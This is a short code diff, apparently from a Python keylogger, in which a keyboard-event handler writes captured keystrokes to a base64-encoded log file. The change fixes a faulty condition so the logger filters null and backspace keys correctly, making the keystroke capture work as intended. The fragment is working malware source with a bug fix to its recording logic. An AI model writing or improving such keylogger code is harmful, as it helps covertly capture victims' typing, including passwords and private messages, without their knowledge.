@@ -340,7 +340,7 @@ def keylogger(fd_temp_key: int):
     def OnKeyboardEvent(event):
         """"Define action triggered when a key is pressed.\n"""
         if not thr_block.isSet():
-            if event.Ascii != 0 or 8:
+            if event.Ascii != 0 and event.Ascii != 8:
                 # Use base64 and not an encryption just for performance
                 with open(keylogfile, 'r+b') as f_key:
                     data_decoded = b64decode(f_key.read()).decode('utf-8')
